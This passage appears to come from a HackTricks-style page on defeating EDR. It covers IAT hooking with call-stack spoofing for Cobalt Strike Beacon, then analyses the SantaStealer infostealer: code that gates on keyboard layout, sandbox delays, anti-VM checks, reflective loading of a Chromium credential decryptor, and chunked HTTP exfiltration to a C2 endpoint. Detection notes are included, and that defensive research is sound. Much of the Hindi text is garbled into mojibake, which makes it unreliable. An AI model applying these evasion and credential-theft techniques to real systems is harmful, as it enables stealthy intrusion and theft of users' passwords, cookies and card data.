- рдпрд╣ рдЙрди рдХрд┐рд╕реА рднреА code рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬреЛ hooked import рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, tool code рдХреЛ modify рдХрд┐рдП рдмрд┐рдирд╛ рдпрд╛ Beacon рдкрд░ specific APIs рдХреЛ proxy рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реБрдП рдмрд┐рдирд╛ред
- postтАСex DLLs рдХреЛ рднреА рдХрд╡рд░ рдХрд░рддрд╛ рд╣реИ: LoadLibrary* рдХреЛ hook рдХрд░рдиреЗ рд╕реЗ рдЖрдк module loads (рдЙрджрд╛., System.Management.Automation.dll, clr.dll) intercept рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреЗ API calls рдкрд░ рд╡рд╣реА masking/stack evasion рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- CreateProcessA/W рдХреЛ wrap рдХрд░рдХреЗ callтАСstackтАУbased detections рдХреЗ рдЦрд┐рд▓рд╛рдл processтАСspawning postтАСex commands рдХреЗ рднрд░реЛрд╕реЗрдордВрдж рдЙрдкрдпреЛрдЧ рдХреЛ рдмрд╣рд╛рд▓ рдХрд░рддрд╛ рд╣реИред

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW тЖТ RX transitions for PIC and avoid leaving writable+executable pages.

CallтАСstack spoofing stub
- DraugrтАСstyle PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Reflective loader рдХреЛ postтАСex DLLs рдХреЗ рдЖрдЧреЗ prepend рдХрд░реЗрдВ рддрд╛рдХрд┐ PIC рдФрд░ hooks DLL рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рд╕реНрд╡рддрдГ initialise рд╣реЛ рдЬрд╛рдПрдБред
- Target APIs рдХреЛ register рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Aggressor script рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ Beacon рдФрд░ BOFs рдмрд┐рдирд╛ code changes рдХреЗ рдЙрд╕реА evasion path рд╕реЗ рдкрд╛рд░рджрд░реНрд╢реА рд▓рд╛рдн рдЙрдард╛рдПрдВред

Detection/DFIR considerations
- IAT integrity: рдРрд╕реЗ entries рдЬреЛ nonтАСimage (heap/anon) addresses рдкрд░ resolve рд╣реЛрддреЗ рд╣реИрдВ; import pointers рдХрд╛ periodic verificationред
- Stack anomalies: return addresses рдЬреЛ loaded images рдХреЗ рдирд╣реАрдВ рд╣реИрдВ; nonтАСimage PIC рдХреА abrupt transitions; inconsistent RtlUserThreadStart ancestryред
- Loader telemetry: inтАСprocess writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at loadред
- ImageтАСload evasion: рдпрджрд┐ hooking LoadLibrary* рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ memory masking events рдХреЗ рд╕рд╛рде correlated automation/clr assemblies рдХреЗ suspicious loads рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВред

Related building blocks and examples
- Reflective loaders рдЬреЛ load рдХреЗ рджреМрд░рд╛рди IAT patching рдХрд░рддреЗ рд╣реИрдВ (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) рдФрд░ stackтАСcutting PIC (stackcutting)
- PIC callтАСstack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдзреБрдирд┐рдХ info-stealers рдХреИрд╕реЗ AV bypass, anti-analysis рдФрд░ credential access рдХреЛ рдПрдХ рд╣реА workflow рдореЗрдВ рдорд┐рд▓рд╛рддреЗ рд╣реИрдВред

### Keyboard layout gating & sandbox delay

- рдПрдХ config flag (`anti_cis`) рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП keyboard layouts рдХреЛ `GetKeyboardLayoutList` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ enumerate рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдИ Cyrillic layout рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ sample рдПрдХ рдЦрд╛рд▓реА `CIS` marker drop рдХрд░рддрд╛ рд╣реИ рдФрд░ stealers рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ terminate рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ excluded locales рдкрд░ рдХрднреА detonate рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдЬрдмрдХрд┐ рдПрдХ hunting artifact рдЫреЛрдбрд╝рддрд╛ рд╣реИред
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### рдкрд░рддрджрд╛рд░ `check_antivm` рд▓реЙрдЬрд┐рдХ

- Variant A рдкреНрд░реЛрд╕реЗрд╕ рд▓рд┐рд╕реНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдирд╛рдо рдХрд╛ рдПрдХ рдХрд╕реНрдЯрдо rolling checksum рд▓реЗрдХрд░ рдЙрд╕реЗ рдПрдореНрдмреЗрдбреЗрдб blocklists (debuggers/sandboxes) рд╕реЗ рдорд┐рд▓рд╛рддрд╛ рд╣реИ; рдпрд╣ checksum рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдо рдкрд░ рджреЛрд╣рд░рд╛рддрд╛ рд╣реИ рдФрд░ `C:\analysis` рдЬреИрд╕реЗ working directories рдХреА рдЬрд╛рдБрдЪ рдХрд░рддрд╛ рд╣реИред
- Variant B рд╕рд┐рд╕реНрдЯрдо рдЧреБрдгреЛрдВ (process-count floor, recent uptime) рдХреА рдЬрд╛рдБрдЪ рдХрд░рддрд╛ рд╣реИ, VirtualBox additions рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП `OpenServiceA("VBoxGuest")` рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рдФрд░ single-stepping рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП sleep рдХреЗ рдЖрд╕рдкрд╛рд╕ timing checks рдХрд░рддрд╛ рд╣реИред рдХрд┐рд╕реА рднреА рдорд┐рд▓рд╛рди рдкрд░ рдореЙрдбреНрдпреВрд▓ рд▓реЙрдиреНрдЪ рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд░рджреНрдж рдХрд░ рджреА рдЬрд╛рддреА рд╣реИред

### Fileless helper + double ChaCha20 reflective loading

- рдореБрдЦреНрдп DLL/EXE рдореЗрдВ рдПрдХ Chromium credential helper рдПрдореНрдмреЗрдб рд░рд╣рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдпрд╛ рддреЛ рдбрд┐рд╕реНрдХ рдкрд░ drop рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдореЗрдореЛрд░реА рдореЗрдВ manually map рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ; fileless рдореЛрдб imports/relocations рдЦреБрдж рд╣реА resolve рдХрд░рддрд╛ рд╣реИ рдЗрд╕рд▓рд┐рдП рдХреЛрдИ helper artifacts рд▓рд┐рдЦреЗ рдирд╣реАрдВ рдЬрд╛рддреЗред
- рд╡рд╣ helper рдПрдХ second-stage DLL рдХреЛ ChaCha20 рд╕реЗ рджреЛ рдмрд╛рд░ encrypt рдХрд░рдХреЗ store рдХрд░рддрд╛ рд╣реИ (рджреЛ 32-byte keys + 12-byte nonces)ред рджреЛрдиреЛрдВ рдкрд╛рд╕ рдХреЗ рдмрд╛рдж рдпрд╣ blob рдХреЛ reflectively load рдХрд░рддрд╛ рд╣реИ (no `LoadLibrary`) рдФрд░ ChromElevator рд╕реЗ рдирд┐рдХрд▓реЗ exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)ред
- ChromElevator routines direct-syscall reflective process hollowing рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА live Chromium browser рдореЗрдВ inject рдХрд░рддреЗ рд╣реИрдВ, AppBound Encryption keys inherit рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ ABE hardening рдХреЗ рдмрд╛рд╡рдЬреВрдж SQLite databases рд╕реЗ рд╕реАрдзреЗ passwords/cookies/credit cards decrypt рдХрд░рддреЗ рд╣реИрдВред

### рдореЙрдбреНрдпреВрд▓рд░ in-memory collection & chunked HTTP exfil

- `create_memory_based_log` рдПрдХ global `memory_generators` function-pointer table рдкрд░ iterate рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╣рд░ enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, рдЖрджрд┐) рдХреЗ рд▓рд┐рдП рдПрдХ thread spawn рдХрд░рддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ thread shared buffers рдореЗрдВ рдкрд░рд┐рдгрд╛рдо рд▓рд┐рдЦрддрд╛ рд╣реИ рдФрд░ рд▓рдЧрднрдЧ 45s рдХреЗ join window рдХреЗ рдмрд╛рдж рдЕрдкрдиреА file count рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рддрд╛ рд╣реИред
- рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░, рд╕рдм рдХреБрдЫ statically linked `miniz` library рд╕реЗ `%TEMP%\\Log.zip` рдХреЗ рд░реВрдк рдореЗрдВ zip рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `ThreadPayload1` рдлрд┐рд░ 15s рдХреЗ рд▓рд┐рдпреЗ sleep рдХрд░рддрд╛ рд╣реИ рдФрд░ archive рдХреЛ 10тАпMB chunks рдореЗрдВ HTTP POST рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `http://<C2>:6767/upload` рдкрд░ stream рдХрд░рддрд╛ рд╣реИ, browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) рдХреЛ spoof рдХрд░рддреЗ рд╣реБрдПред рдкреНрд░рддреНрдпреЗрдХ chunk рдореЗрдВ `User-Agent: upload`, `auth: <build_id>`, рд╡реИрдХрд▓реНрдкрд┐рдХ `w: <campaign_tag>` рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЖрдЦрд┐рд░реА chunk рдореЗрдВ `complete: true` рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ C2 рдХреЛ reassembly рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХрд╛ рдкрддрд╛ рдЪрд▓ рд╕рдХреЗред

## References

- [Crystal Kit тАУ blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit тАУ GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic тАУ Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace тАУ docs](https://tradecraftgarden.org/docs.html)
- [simplehook тАУ sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting тАУ sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr тАУ call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 тАУ New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv тАУ Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research тАУ Before ToolShell: Exploring Storm-2603тАЩs Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn тАУ DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs тАУ Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft тАУ Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft тАУ EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals тАУ Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium тАУ Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium тАУ Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft тАУ mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research тАУ Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 тАУ SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator тАУ Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research тАУ GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
